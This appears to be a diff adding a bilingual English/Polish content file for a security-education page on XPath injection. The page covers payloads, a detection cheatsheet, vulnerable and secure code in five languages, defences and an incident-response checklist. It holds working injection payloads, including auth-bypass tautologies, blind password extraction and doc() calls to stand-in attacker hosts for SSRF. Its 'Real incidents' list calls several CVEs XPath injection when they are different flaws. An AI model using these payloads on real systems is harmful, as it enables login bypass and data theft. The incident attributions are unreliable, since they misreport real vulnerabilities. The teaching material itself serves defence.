@@ -1,0 +1,600 @@
+meta:
+  id: xpathi
+  threatId: "1.5"
+  severity: High
+  color: "#f97316"
+  colorRgb: 249,115,22
+  cwe: CWE-643
+  cvss: "9.8"
+  standard: OWASP A03:2021
+hero:
+  titleMain: "XPath "
+  titleGrad: Injection
+  titleTail: ""
+  topbar: XPath Injection
+  lead:
+    en: "XPath Injection attacks the expression syntax of an XML query rather than a database. User input concatenated into an XPath expression lets an attacker inject metacharacters — ', \", [, ], /, *, | — to rewrite the query logic. A login that builds //user[name=INPUT and password=INPUT] by concatenation can be bypassed with ' or '1'='1, an always-true predicate matching every user node. Beyond auth bypass, axes traversal, the | union operator, and the XPath 2.0 doc() function escalate a single injection point into full document extraction and even SSRF."
+    pl: "XPath Injection atakuje składnię wyrażenia zapytania XML, a nie bazy danych. Wejście użytkownika sklejone z wyrażeniem XPath pozwala wstrzyknąć metaznaki — ', \", [, ], /, *, | — by przepisać logikę zapytania. Logowanie budujące //user[name=INPUT and password=INPUT] przez konkatenację można obejść przez ' or '1'='1, zawsze prawdziwy predykat pasujący do każdego węzła user. Poza obejściem logowania, osie, operator unii | oraz funkcja doc() z XPath 2.0 eskalują pojedynczy punkt wstrzyknięcia do pełnej ekstrakcji dokumentu, a nawet SSRF."
+  metrics:
+    - k: CWE-643
+      v:
+        en: Weakness ID
+        pl: ID słabości
+    - k: "9.8"
+      v: CVSS · High
+    - k: A03:2021
+      v: OWASP Top 10
+    - k: "8"
+      v:
+        en: Attack variants
+        pl: Warianty ataku
+  sources:
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-643 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/643.html
+    - label: PortSwigger Academy
+      url: https://portswigger.net/web-security/xpath-injection
+    - label: OWASP Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
+sectionOrder:
+  - overview
+  - types
+  - cheatsheet
+  - code
+  - orm
+  - method
+  - defense
+  - incidents
+  - tools
+  - compliance
+  - ir
+  - sources
+nav:
+  - id: overview
+    en: Overview
+    pl: Przegląd
+  - id: types
+    en: Attack types
+    pl: Typy ataków
+  - id: cheatsheet
+    en: Detection cheatsheet
+    pl: Ściąga detekcji
+  - id: code
+    en: Vuln vs Secure
+    pl: Podatny vs Bezpieczny
+  - id: orm
+    en: Language cheatsheet
+    pl: Ściąga języków
+  - id: method
+    en: Methodology
+    pl: Metodyka
+  - id: defense
+    en: Defense layers
+    pl: Warstwy obrony
+  - id: incidents
+    en: Real incidents
+    pl: Incydenty
+  - id: tools
+    en: SAST / DAST
+    pl: SAST / DAST
+  - id: compliance
+    en: Compliance
+    pl: Zgodność
+  - id: ir
+    en: Incident response
+    pl: Reagowanie
+  - id: sources
+    en: Sources
+    pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Eight ways the same root cause manifests — from an always-true auth bypass to XPath 2.0 doc() SSRF and SAML signature bypass.
+      pl: Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od zawsze prawdziwego obejścia logowania po SSRF przez doc() w XPath 2.0 i obejście podpisu SAML.
+    items:
+      - name: Auth Bypass (Always-True)
+        sev: critical
+        description:
+          en: Injecting ' or '1'='1 into //user[name=INPUT and password=INPUT] forms an always-true predicate that matches every user node — full authentication bypass.
+          pl: Wstrzyknięcie ' or '1'='1 do //user[name=INPUT and password=INPUT] tworzy zawsze prawdziwy predykat pasujący do każdego węzła user — pełne obejście logowania.
+        payload: "' or '1'='1   →   //user[name='' or '1'='1']"
+      - name: Full Document Extraction
+        sev: high
+        description:
+          en: A wildcard like /*|//* or //text()[position()=N] dumps the entire XML tree node by node, exfiltrating every element and text value the document holds.
+          pl: Wildcard /*|//* lub //text()[position()=N] zrzuca całe drzewo XML węzeł po węźle, eksfiltrując każdy element i wartość tekstową dokumentu.
+        payload: /*|//*   or   //text()[position()=N]
+      - name: Blind Boolean Enumeration
+        sev: high
+        description:
+          en: substring(//user[1]/password,1,1)='a' yields a differential response that reveals stored values one character at a time without any data returned directly.
+          pl: substring(//user[1]/password,1,1)='a' daje różnicową odpowiedź ujawniającą wartości znak po znaku, bez bezpośredniego zwracania danych.
+        payload: substring(//user[1]/password,1,1)='a'
+      - name: Error-Based Extraction
+        sev: high
+        description:
+          en: A .NET XPathException leaks element names; in XPath 2.0 a forced XPTY0004 type error acts as an oracle to confirm and extract structure from error text.
+          pl: Wyjątek XPathException w .NET wycieka nazwy elementów; w XPath 2.0 wymuszony błąd typu XPTY0004 działa jak wyrocznia potwierdzająca i eksfiltrująca strukturę z treści błędu.
+        payload: "'[   →   XPathException / XPTY0004"
+      - name: XPath Axes Traversal
+        sev: high
+        description:
+          en: ancestor::*, following-sibling::* and parent::* navigate outside the intended query scope, reaching any node in the document regardless of the original predicate.
+          pl: ancestor::*, following-sibling::* i parent::* nawigują poza zamierzony zakres zapytania, sięgając dowolnego węzła dokumentu niezależnie od pierwotnego predykatu.
+        payload: ancestor::* | following-sibling::* | parent::*
+      - name: Union Operator Abuse
+        sev: high
+        description:
+          en: The | union operator appends unintended node sets — | //password | //secret merges sensitive nodes into the result of an otherwise harmless query.
+          pl: Operator unii | dokleja niezamierzone zbiory węzłów — | //password | //secret scala wrażliwe węzły z wynikiem skądinąd niewinnego zapytania.
+        payload: "| //password | //secret"
+      - name: XPath 2.0 doc() SSRF
+        sev: high
+        description:
+          en: In XPath 2.0 the doc('http://attacker.com/data') function loads an external document over the network, turning an injection point into server-side request forgery.
+          pl: W XPath 2.0 funkcja doc('http://attacker.com/data') ładuje zewnętrzny dokument przez sieć, zamieniając punkt wstrzyknięcia w SSRF.
+        payload: doc('http://attacker.com/data')
+      - name: SAML / XMLDSig Bypass
+        sev: critical
+        description:
+          en: Manipulating the XPath Filter Transform bypasses the integrity check of an XML Digital Signature, letting an attacker tamper with signed SAML assertions undetected.
+          pl: Manipulacja XPath Filter Transform omija kontrolę integralności podpisu cyfrowego XML, pozwalając niezauważenie modyfikować podpisane asercje SAML.
+        payload: XPath Filter Transform → XMLDSig bypass
+  cheatsheet:
+    title:
+      en: Detection cheatsheet
+      pl: Ściąga detekcji
+    lead:
+      en: Five practical methods to confirm an XPath injection point — from auth-bypass probes to out-of-band doc() SSRF callbacks.
+      pl: Pięć praktycznych metod potwierdzenia punktu wstrzyknięcia XPath — od sond obejścia logowania po callbacki SSRF przez doc() poza pasmem.
+    groups:
+      - name: Auth bypass probe
+        rows:
+          - - Vector
+            - "' or '1'='1"
+          - - Alt
+            - x' or 1=1 or 'x'='x
+          - - Where
+            - username / login field
+          - - Signal
+            - login succeeds, no password
+          - - Filter
+            - //user[name='' or '1'='1']
+          - - Confirm
+            - access without credentials
+      - name: Boolean differential
+        rows:
+          - - Vector
+            - "' and substring(name(/*[1]),1,1)='a"
+          - - Alt
+            - ...='b
+          - - Where
+            - searchable predicate input
+          - - Signal
+            - different responses a vs b
+          - - Use
+            - char-by-char extraction
+          - - Confirm
+            - state changes by char
+      - name: Error-based
+        rows:
+          - - Vector
+            - "'[  (unclosed bracket)"
+          - - Where
+            - any predicate parameter
+          - - Signal
+            - XPath parse error
+          - - Leak
+            - XPath engine / element names
+          - - Use
+            - fingerprint XML backend
+          - - Confirm
+            - error text in response
+      - name: Axes probe
+        rows:
+          - - Vector
+            - "' or ancestor::*"
+          - - Where
+            - predicate input field
+          - - Signal
+            - more results returned
+          - - Method
+            - scope-escape via axes
+          - - Use
+            - reach nodes out of scope
+          - - Confirm
+            - extra node set returned
+      - name: XPath 2.0 SSRF test
+        rows:
+          - - Vector
+            - doc('http://burpcollaborator.net')
+          - - Where
+            - XPath 2.0 capable engine
+          - - Signal
+            - DNS / HTTP callback
+          - - Confirm
+            - doc() availability
+          - - Impact
+            - server-side request forgery
+          - - Tool
+            - OAST / Burp Collaborator
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: "The same fix across five languages: never concatenate raw input into an XPath expression — bind variables or, where unavailable, allowlist and escape."
+      pl: "Ta sama naprawa w pięciu językach: nigdy nie sklejaj surowego wejścia z wyrażeniem XPath — wiąż zmienne lub, gdy to niemożliwe, stosuj allowlistę i escape."
+    languages:
+      - label: Java
+        lang: java
+        vulnerable: |-
+          // VULNERABLE — user input concatenated into the XPath expression
+          String user = request.getParameter("user");
+          XPath xpath = XPathFactory.newInstance().newXPath();
+          NodeList r = (NodeList) xpath.evaluate(
+              "/users/user[name='" + user + "']", doc, XPathConstants.NODESET);
+        safe: |-
+          // SECURE — XPathVariableResolver binds a compiled variable
+          String user = request.getParameter("user");
+          XPath xpath = XPathFactory.newInstance().newXPath();
+          xpath.setXPathVariableResolver(v -> "user".equals(v.getLocalPart()) ? user : null);
+          XPathExpression expr = xpath.compile("/users/user[name=$user]");
+          NodeList r = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
+      - label: Python (lxml)
+        lang: python
+        vulnerable: |-
+          # VULNERABLE (lxml) — f-string interpolation into the path
+          user = request.args.get("user")   # could be "' or '1'='1"
+          nodes = root.xpath(f"//user[name='{user}']")
+        safe: |-
+          # SECURE — lxml keyword arguments bind variables safely
+          user = request.args.get("user")
+          nodes = root.xpath("//user[name=$name]", name=user)
+      - label: PHP
+        lang: php
+        vulnerable: |-
+          <?php // VULNERABLE — raw input concatenated into the query
+          $user = $_GET['user'];   // ?user=' or '1'='1
+          $r = $xpath->query("//user[name='" . $user . "']");
+        safe: |-
+          <?php // SECURE — PHP has no native binding: allowlist + escape
+          if (!preg_match('/^[A-Za-z0-9_]+$/', $_GET['user'])) { http_response_code(400); exit; }
+          $user = addslashes($_GET['user']);
+          $r = $xpath->query("//user[name='" . $user . "']");
+      - label: .NET
+        lang: csharp
+        vulnerable: |-
+          // VULNERABLE — string concatenation into SelectNodes
+          string u = Request.QueryString["user"];
+          XmlNodeList r = doc.SelectNodes("//user[name='" + u + "']");
+        safe: |-
+          // SECURE — XPathNavigator + compiled expr with a variable context
+          var nav = doc.CreateNavigator();
+          var ctx = new CustomXsltContext();          // supplies the $user variable
+          ctx.AddVariable("user", Request.QueryString["user"]);
+          XPathExpression expr = nav.Compile("//user[name=$user]");
+          expr.SetContext(ctx);
+          XPathNodeIterator r = nav.Select(expr);
+      - label: Node.js
+        lang: javascript
+        vulnerable: |-
+          // VULNERABLE (xpath) — expression built from input
+          const u = req.query.user;   // "' or '1'='1"
+          const r = xpath.select("//user[name='" + u + "']", doc);
+        safe: |-
+          // SECURE — pass variables via the resolver argument
+          const u = req.query.user;
+          const r = xpath.select("//user[name=$name]", doc, null, null, { name: u });
+  orm:
+    title:
+      en: Language cheatsheet
+      pl: Ściąga języków
+    lead:
+      en: "Per-language vulnerable sinks and their safe alternatives. The pattern is identical everywhere: stop concatenating and start binding variables."
+      pl: "Podatne sinki per język i ich bezpieczne odpowiedniki. Wzorzec jest wszędzie identyczny: przestań sklejać, zacznij wiązać zmienne."
+    rows:
+      - fw: Java
+        api: evaluate("/users/user[name='"+user+"']")
+        note:
+          en: "Vulnerable sink — string concatenation. Safe alternative: XPathVariableResolver with a compiled expression and $user variable binding."
+          pl: "Podatny sink — konkatenacja stringów. Bezpiecznie: XPathVariableResolver ze skompilowanym wyrażeniem i wiązaniem zmiennej $user."
+      - fw: Python (lxml)
+        api: root.xpath(f"//user[name='{user}']")
+        note:
+          en: "Vulnerable sink — f-string interpolation. Safe alternative: root.xpath(\"//user[name=$name]\", name=user) keyword binding."
+          pl: "Podatny sink — interpolacja f-stringa. Bezpiecznie: root.xpath(\"//user[name=$name]\", name=user) z wiązaniem przez argument."
+      - fw: PHP
+        api: $xpath->query("//user[name='$user']")
+        note:
+          en: "Vulnerable sink — interpolation; no native parameterization. Safe alternative: allowlist validation + addslashes()."
+          pl: "Podatny sink — interpolacja; brak natywnej parametryzacji. Bezpiecznie: walidacja allowlist + addslashes()."
+      - fw: .NET
+        api: doc.SelectNodes("//user[name='"+u+"']")
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: XPathNavigator with a compiled expression and XPathExpression.SetContext()."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: XPathNavigator ze skompilowanym wyrażeniem i XPathExpression.SetContext()."
+      - fw: Node.js
+        api: xpath.select("//user[name='"+u+"']", doc)
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: xpath.select(\"//user[name=$name]\", doc, null, null, {name: u})."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: xpath.select(\"//user[name=$name]\", doc, null, null, {name: u})."
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from a probe to full compromise.
+      pl: Jak atakujący przechodzi od sondy do pełnej kompromitacji.
+    steps:
+      - title:
+          en: Detect
+          pl: Wykrycie
+        description:
+          en: Send ' or '1'='1 (or x' or 1=1 or 'x'='x) where a value is expected — a login that succeeds without a password reveals injectability.
+          pl: Wyślij ' or '1'='1 (lub x' or 1=1 or 'x'='x) tam, gdzie oczekiwana jest wartość — logowanie bez hasła ujawnia podatność.
+      - title:
+          en: Fingerprint
+          pl: Identyfikacja
+        description:
+          en: Inject an unclosed bracket '[ — the XPath parse error text leaks the engine type and, in .NET, element names from XPathException.
+          pl: Wstrzyknij niezamknięty nawias '[ — treść błędu parsowania XPath zdradza typ silnika, a w .NET nazwy elementów z XPathException.
+      - title:
+          en: Bypass auth
+          pl: Obejście logowania
+        description:
+          en: Close the predicate with ' or '1'='1 to form an always-true tautology that matches every user node and skips password verification.
+          pl: Zamknij predykat przez ' or '1'='1, tworząc zawsze prawdziwą tautologię pasującą do każdego węzła user i pomijając weryfikację hasła.
+      - title:
+          en: Extract
+          pl: Ekstrakcja
+        description:
+          en: Use substring(//user[1]/password,1,1)='a' boolean differentials to read stored values one character at a time, or /*|//* to dump the whole tree.
+          pl: Użyj różnic boolean substring(//user[1]/password,1,1)='a', by czytać wartości znak po znaku, lub /*|//*, by zrzucić całe drzewo.
+      - title:
+          en: Escalate
+          pl: Eskalacja
+        description:
+          en: Traverse axes (ancestor::*, following-sibling::*) and abuse | to merge //password nodes; in XPath 2.0 call doc('http://oast.me/x') for SSRF.
+          pl: Przejdź osie (ancestor::*, following-sibling::*) i nadużyj | by scalić węzły //password; w XPath 2.0 wywołaj doc('http://oast.me/x') dla SSRF.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Defense in depth — but not all layers are equal. Parameterized XPath is the fix; everything else reduces blast radius.
+      pl: Obrona w głąb — ale warstwy nie są równe. Parametryzowany XPath to naprawa; reszta ogranicza skutki.
+    items:
+      - rank: 1
+        eff: 100
+        kind: primary
+        label:
+          en: Parameterized XPath (variable binding)
+          pl: Parametryzowany XPath (wiązanie zmiennych)
+        note:
+          en: "Variable binding separates the expression from the data: Java XPathVariableResolver, lxml keyword args, .NET SetContext. Stops injection at the source."
+          pl: "Wiązanie zmiennych oddziela wyrażenie od danych: Java XPathVariableResolver, argumenty lxml, .NET SetContext. Zatrzymuje wstrzyknięcie u źródła."
+      - rank: 2
+        eff: 85
+        kind: strong
+        label:
+          en: Input allowlisting
+          pl: Allowlista wejścia
+        note:
+          en: "Usernames: alphanumeric only; reject ', \", [, ], /, *, @ before the expression is ever built."
+          pl: "Loginy: tylko alfanumeryczne; odrzucaj ', \", [, ], /, *, @ zanim wyrażenie powstanie."
+      - rank: 3
+        eff: 75
+        kind: strong
+        label:
+          en: XML schema validation
+          pl: Walidacja schematu XML
+        note:
+          en: Validate document structure with XSD / RelaxNG before querying so unexpected nodes and shapes are rejected upfront.
+          pl: Waliduj strukturę dokumentu przez XSD / RelaxNG przed zapytaniem, by nieoczekiwane węzły i kształty były odrzucane z góry.
+      - rank: 4
+        eff: 60
+        kind: mitigation
+        label:
+          en: Principle of least information
+          pl: Zasada najmniejszej informacji
+        note:
+          en: Query only the nodes you need; never use // or * wildcards in production paths — limits what a successful injection can reach.
+          pl: Odpytuj tylko potrzebne węzły; nigdy nie używaj wildcardów // ani * w ścieżkach produkcyjnych — ogranicza zasięg udanego wstrzyknięcia.
+      - rank: 5
+        eff: 55
+        kind: mitigation
+        label:
+          en: Disable XPath 2.0 functions
+          pl: Wyłącz funkcje XPath 2.0
+        note:
+          en: Restrict doc() and collection() to prevent SSRF and external document loading from injected expressions.
+          pl: Ogranicz doc() i collection(), by zapobiec SSRF i ładowaniu zewnętrznych dokumentów z wstrzykniętych wyrażeń.
+      - rank: 6
+        eff: 40
+        kind: mitigation
+        label:
+          en: Error suppression
+          pl: Tłumienie błędów
+        note:
+          en: Never expose XPath parse errors to clients — error text is an extraction oracle for blind and error-based attacks.
+          pl: Nigdy nie ujawniaj błędów parsowania XPath klientom — treść błędu to wyrocznia ekstrakcji dla ataków ślepych i opartych na błędach.
+      - rank: 7
+        eff: 20
+        kind: weak
+        label:
+          en: SAST + WAF (compensating)
+          pl: SAST + WAF (kompensacyjnie)
+        note:
+          en: Taint-track HTTP params to evaluate/compile sinks; WAF rules block ' or quote/bracket patterns. Easily bypassed — never a primary control.
+          pl: Śledź taint od parametrów HTTP do sinków evaluate/compile; reguły WAF blokują ' i wzorce cudzysłowów/nawiasów. Łatwe do obejścia — nigdy jako główna kontrola.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: XPath injection is not theoretical — Keycloak and Spring WS each reached CVSS 9.8 unauthenticated, and SAP NetWeaver allowed full XML extraction.
+      pl: XPath injection nie jest teoretyczne — Keycloak i Spring WS osiągnęły nieautoryzowane CVSS 9.8, a SAP NetWeaver pozwalał na pełną ekstrakcję XML.
+    items:
+      - org: Keycloak
+        year: 2020
+        impact: CVE-2020-10770
+        cost: CVSS 9.8 · SAML
+        description:
+          en: Unauthenticated XPath injection in the Keycloak SAML endpoint (CVSS 9.8) — Red Hat identity platform affecting enterprise SSO deployments.
+          pl: Nieautoryzowane wstrzyknięcie XPath w endpoincie SAML Keycloak (CVSS 9.8) — platforma tożsamości Red Hat dotykająca firmowych wdrożeń SSO.
+      - org: Spring Web Services
+        year: 2019
+        impact: CVE-2019-3773
+        cost: CVSS 9.8
+        description:
+          en: XPath injection in Spring-WS XML processing (CVSS 9.8) — affects all Spring WS applications parsing user-controlled XML.
+          pl: Wstrzyknięcie XPath w przetwarzaniu XML Spring-WS (CVSS 9.8) — dotyka wszystkich aplikacji Spring WS parsujących XML kontrolowany przez użytkownika.
+      - org: Apache Ant
+        year: 2020
+        impact: CVE-2020-11979
+        cost: CVSS 9.1
+        description:
+          en: XPath injection in Apache Ant build-file processing (CVSS 9.1) — malicious build files could manipulate XPath queries during the build.
+          pl: Wstrzyknięcie XPath w przetwarzaniu plików build Apache Ant (CVSS 9.1) — złośliwe pliki build mogły manipulować zapytaniami XPath podczas budowania.
+      - org: Spring Framework
+        year: 2014
+        impact: CVE-2014-0225
+        cost: Param binding
+        description:
+          en: XPath injection via HTTP parameter binding into XML queries in the Spring Framework — user parameters flowed into XPath evaluation.
+          pl: Wstrzyknięcie XPath przez wiązanie parametrów HTTP do zapytań XML w Spring Framework — parametry użytkownika trafiały do ewaluacji XPath.
+      - org: SAP NetWeaver UDDI
+        year: 2016
+        impact: CVE-2016-2386
+        cost: Unauth · extraction
+        description:
+          en: Unauthenticated XPath injection in the SAP NetWeaver UDDI enterprise service registry, allowing full XML document extraction.
+          pl: Nieautoryzowane wstrzyknięcie XPath w rejestrze usług SAP NetWeaver UDDI, umożliwiające pełną ekstrakcję dokumentu XML.
+      - org: Oracle Portal
+        year: 2010
+        impact: Credential leak
+        cost: XML config store
+        description:
+          en: XPath injection in Oracle Portal content queries enabling credential extraction from XML configuration stores.
+          pl: Wstrzyknięcie XPath w zapytaniach treści Oracle Portal umożliwiające ekstrakcję poświadczeń z magazynów konfiguracji XML.
+    inlineSources:
+      - label: Keycloak CVE-2020-10770
+        url: https://nvd.nist.gov/vuln/detail/CVE-2020-10770
+      - label: Spring WS CVE-2019-3773
+        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3773
+      - label: Apache Ant CVE-2020-11979
+        url: https://nvd.nist.gov/vuln/detail/CVE-2020-11979
+      - label: SAP CVE-2016-2386
+        url: https://nvd.nist.gov/vuln/detail/CVE-2016-2386
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis catches input flowing into evaluate/compile sinks; dynamic tools confirm exploitability. Use both.
+      pl: Analiza statyczna łapie wejście trafiające do sinków evaluate/compile; narzędzia dynamiczne potwierdzają eksploatowalność. Używaj obu.
+    sast:
+      - - Semgrep
+        - "xpath-injection rules: input → evaluate sink"
+      - - Checkmarx
+        - XPath_Injection query
+      - - Fortify
+        - XPath Injection category
+      - - CodeQL
+        - js/xml/java XPath taint queries
+    dast:
+      - - Burp Suite
+        - Active Scan XPath injection probes
+      - - OWASP ZAP
+        - XPath injection active rules
+      - - xcat
+        - Automated blind XPath extraction
+      - - Burp Collaborator
+        - doc() SSRF / OAST callbacks
+    note:
+      en: <strong>Key signal:</strong> grep for XPath expressions built by concatenation — <code>"//user[name='" + user</code>, <code>f"//user[name='{user}']"</code>, <code>SelectNodes("//..." +</code> — and for any reachable <code>doc()</code> / <code>collection()</code> call.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj wyrażeń XPath budowanych przez konkatenację — <code>"//user[name='" + user</code>, <code>f"//user[name='{user}']"</code>, <code>SelectNodes("//..." +</code> — oraz każdego osiągalnego wywołania <code>doc()</code> / <code>collection()</code>.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Where XPath injection prevention maps onto the controls auditors check.
+      pl: Gdzie zapobieganie XPath injection mapuje się na kontrole sprawdzane przez audytorów.
+    items:
+      - std: PCI DSS v4.0
+        items:
+          - Req 6.3.1 — XML config files storing card data
+          - protected from XPath injection
+          - Req 11.3 — penetration testing
+      - std: SOC 2
+        items:
+          - CC6.1 — logical access controls
+          - injection-free XML authentication flows
+          - CC7.1 — vulnerability scanning evidence
+      - std: GDPR
+        items:
+          - Art. 32 — appropriate technical measures
+          - XML directories with PII → breach reportable
+          - if extracted via XPath injection
+    inlineSources:
+      - label: PCI DSS v4.0
+        url: https://www.pcisecuritystandards.org/document_library/
+      - label: GDPR Art. 32
+        url: https://gdpr-info.eu/art-32-gdpr/
+      - label: GDPR Art. 33
+        url: https://gdpr-info.eu/art-33-gdpr/
+      - label: SOC 2 (AICPA)
+        url: https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm an active XPath injection breach, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnego wycieku XPath injection przejdź tę listę od góry.
+    steps:
+      - en: Isolate the affected XML-backed service / XPath endpoint
+        pl: Odizoluj dotkniętą usługę opartą o XML / endpoint XPath
+      - en: Preserve application and XML parser logs (queries, doc() calls)
+        pl: Zabezpiecz logi aplikacji i parsera XML (zapytania, wywołania doc())
+      - en: Rotate any credentials stored in queried XML config stores
+        pl: Zrotuj poświadczenia przechowywane w odpytywanych magazynach XML
+      - en: Assess scope — which nodes / attributes / users were queried or exposed
+        pl: Oceń zakres — które węzły / atrybuty / konta odpytano lub ujawniono
+      - en: "Patch: bind variables (parameterized XPath), stop concatenation"
+        pl: "Załataj: wiąż zmienne (parametryzowany XPath), porzuć konkatenację"
+      - en: Disable doc() / collection() and suppress XPath errors to clients
+        pl: Wyłącz doc() / collection() i tłum błędy XPath wobec klientów
+      - en: Notify regulators within 72h (GDPR) and affected users
+        pl: Powiadom regulatorów w 72h (GDPR) i dotkniętych użytkowników
+      - en: "Post-incident: SAST/Burp sweep for sibling evaluate/compile sinks"
+        pl: "Po incydencie: przegląd SAST/Burp pod kątem bliźniaczych sinków evaluate/compile"
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+      - label: OWASP A03:2021 Injection
+        url: https://owasp.org/Top10/A03_2021-Injection/
+      - label: CWE-643 (MITRE)
+        url: https://cwe.mitre.org/data/definitions/643.html
+      - label: OWASP XML Security Cheat Sheet
+        url: https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
+      - label: PortSwigger — XPath injection
+        url: https://portswigger.net/web-security/xpath-injection
+      - label: W3C XPath specification
+        url: https://www.w3.org/TR/xpath/
+      - label: CVE-2020-10770 (Keycloak)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2020-10770
+      - label: CVE-2019-3773 (Spring WS)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3773
+      - label: CVE-2020-11979 (Apache Ant)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2020-11979
+      - label: CVE-2016-2386 (SAP NetWeaver)
+        url: https://nvd.nist.gov/vuln/detail/CVE-2016-2386
